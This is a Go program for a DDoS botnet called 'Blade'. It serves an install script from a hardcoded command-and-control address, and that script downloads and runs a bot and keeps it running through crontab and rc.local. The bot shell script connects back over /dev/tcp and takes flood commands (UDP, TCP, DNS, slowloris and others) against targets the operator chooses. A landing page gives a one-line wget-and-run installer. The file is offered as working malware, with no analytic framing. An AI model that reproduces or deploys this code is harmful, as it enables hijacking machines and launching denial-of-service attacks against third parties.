package main

import (
	"fmt"
	"net"
	"os"
	"strings"
	"time"
)

const (
	HTTP_PORT = 8080
	C2_HOST   = "85.11.167.41"
	C2_PORT   = 1337
)

var botFiles = map[string]string{
	"/install.sh": `#!/bin/bash
# Blade Installer
echo "[+] Installing Blade bot..."
if command -v wget >/dev/null 2>&1; then
    wget -q http://` + C2_HOST + `:` + fmt.Sprintf("%d", HTTP_PORT) + `/bot.sh -O /tmp/bot
    chmod 777 /tmp/bot
    sh /tmp/bot &
elif command -v curl >/dev/null 2>&1; then
    curl -s http://` + C2_HOST + `:` + fmt.Sprintf("%d", HTTP_PORT) + `/bot.sh -o /tmp/bot
    chmod 777 /tmp/bot
    sh /tmp/bot &
else
    echo "[-] No wget or curl found"
    exit 1
fi

if [ -f /etc/crontab ]; then
    echo "*/5 * * * * root wget -q http://` + C2_HOST + `:` + fmt.Sprintf("%d", HTTP_PORT) + `/install.sh -O /tmp/install.sh && sh /tmp/install.sh" >> /etc/crontab
fi
if [ -f /etc/rc.local ]; then
    echo "/tmp/bot &" >> /etc/rc.local
fi
echo "[+] Blade bot installed!"
`,

	"/bot.sh": `#!/bin/sh
# Blade Bot
C2_HOST="` + C2_HOST + `"
C2_PORT="` + fmt.Sprintf("%d", C2_PORT) + `"

while true; do
    exec 5<>/dev/tcp/$C2_HOST/$C2_PORT 2>/dev/null
    echo "busybox" >&5 2>/dev/null
    while read -r cmd <&5 2>/dev/null; do
        case "$cmd" in
            "PING")
                echo "PONG" >&5 2>/dev/null
                ;;
            "udp"*)
                set -- $cmd
                IP=$2
                PORT=$3
                TIME=$4
                end=$(( $(date +%s) + $TIME ))
                while [ $(date +%s) -lt $end ]; do
                    dd if=/dev/urandom bs=1024 count=1 2>/dev/null | nc -u $IP $PORT 2>/dev/null &
                done
                ;;
            "tcp"*)
                set -- $cmd
                IP=$2
                PORT=$3
                TIME=$4
                end=$(( $(date +%s) + $TIME ))
                while [ $(date +%s) -lt $end ]; do
                    nc $IP $PORT 2>/dev/null &
                done
                ;;
            "raw"*)
                set -- $cmd
                IP=$2
                PORT=$3
                TIME=$4
                end=$(( $(date +%s) + $TIME ))
                while [ $(date +%s) -lt $end ]; do
                    dd if=/dev/urandom bs=1024 count=1 2>/dev/null | nc -u $IP $PORT 2>/dev/null &
                    nc $IP $PORT 2>/dev/null &
                done
                ;;
            "gre"*)
                set -- $cmd
                IP=$2
                PORT=$3
                TIME=$4
                end=$(( $(date +%s) + $TIME ))
                while [ $(date +%s) -lt $end ]; do
                    dd if=/dev/urandom bs=1024 count=1 2>/dev/null | nc -u $IP $PORT 2>/dev/null &
                done
                ;;
            "dns"*)
                set -- $cmd
                IP=$2
                PORT=$3
                TIME=$4
                end=$(( $(date +%s) + $TIME ))
                while [ $(date +%s) -lt $end ]; do
                    echo -e "\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01" | nc -u $IP $PORT 2>/dev/null &
                done
                ;;
            "hex"*)
                set -- $cmd
                IP=$2
                PORT=$3
                TIME=$4
                end=$(( $(date +%s) + $TIME ))
                while [ $(date +%s) -lt $end ]; do
                    echo -e "\x55\x55\x55\x55\x00\x00\x00\x01" | nc -u $IP $PORT 2>/dev/null &
                done
                ;;
            "hold"*)
                set -- $cmd
                IP=$2
                PORT=$3
                TIME=$4
                end=$(( $(date +%s) + $TIME ))
                while [ $(date +%s) -lt $end ]; do
                    nc $IP $PORT 2>/dev/null &
                    sleep 10 &
                done
                ;;
            "mix"*)
                set -- $cmd
                IP=$2
                PORT=$3
                TIME=$4
                end=$(( $(date +%s) + $TIME ))
                while [ $(date +%s) -lt $end ]; do
                    dd if=/dev/urandom bs=1024 count=1 2>/dev/null | nc -u $IP $PORT 2>/dev/null &
                    nc $IP $PORT 2>/dev/null &
                done
                ;;
            "slowloris"*)
                set -- $cmd
                IP=$2
                PORT=$3
                TIME=$4
                end=$(( $(date +%s) + $TIME ))
                while [ $(date +%s) -lt $end ]; do
                    nc $IP $PORT 2>/dev/null &
                    sleep 5 &
                done
                ;;
            "stop")
                killall nc 2>/dev/null
                killall dd 2>/dev/null
                ;;
        esac
    done
    sleep 5
done
`,

	"/": `<!DOCTYPE html>
<html>
<head><title>Blade C2</title></head>
<body style="background:#0a0a0a;color:#00ff00;font-family:monospace;padding:30px;">
<h2>⚔️ Blade C2</h2>
<p>C2: ` + C2_HOST + `:` + fmt.Sprintf("%d", C2_PORT) + `</p>
<p>HTTP: ` + C2_HOST + `:` + fmt.Sprintf("%d", HTTP_PORT) + `</p>
<ul>
<li><a href="/bot.sh">/bot.sh</a> - Shell bot</li>
<li><a href="/install.sh">/install.sh</a> - Install script</li>
</ul>
<pre>wget http://` + C2_HOST + `:` + fmt.Sprintf("%d", HTTP_PORT) + `/install.sh && sh install.sh</pre>
</body>
</html>`,
}

func main() {
	listener, err := net.Listen("tcp", ":"+fmt.Sprintf("%d", HTTP_PORT))
	if err != nil {
		fmt.Println("[-] Failed to start web server:", err)
		os.Exit(1)
	}
	defer listener.Close()

	fmt.Println("[+] Blade Web Server started on port", HTTP_PORT)
	fmt.Println("[+] Serving: /bot.sh, /install.sh")

	for {
		conn, err := listener.Accept()
		if err != nil {
			continue
		}
		go handleRequest(conn)
	}
}

func handleRequest(conn net.Conn) {
	defer conn.Close()

	buf := make([]byte, 4096)
	n, err := conn.Read(buf)
	if err != nil {
		return
	}

	request := string(buf[:n])
	lines := strings.Split(request, "\r\n")
	if len(lines) == 0 {
		return
	}

	parts := strings.Split(lines[0], " ")
	if len(parts) < 2 {
		return
	}

	path := parts[1]
	if path == "" {
		path = "/"
	}

	fmt.Printf("[%s] %s\n", time.Now().Format("15:04:05"), path)

	content, ok := botFiles[path]
	if !ok {
		sendResponse(conn, 404, "text/plain", "404 Not Found")
		return
	}

	contentType := "text/plain"
	if strings.HasSuffix(path, ".sh") {
		contentType = "text/x-sh"
	} else if strings.HasSuffix(path, ".html") || path == "/" {
		contentType = "text/html"
	}

	sendResponse(conn, 200, contentType, content)
}

func sendResponse(conn net.Conn, status int, contentType, body string) {
	statusText := "OK"
	if status == 404 {
		statusText = "Not Found"
	}

	response := fmt.Sprintf("HTTP/1.1 %d %s\r\n", status, statusText)
	response += fmt.Sprintf("Content-Type: %s\r\n", contentType)
	response += fmt.Sprintf("Content-Length: %d\r\n", len(body))
	response += "Connection: close\r\n"
	response += "\r\n"
	response += body

	conn.Write([]byte(response))
}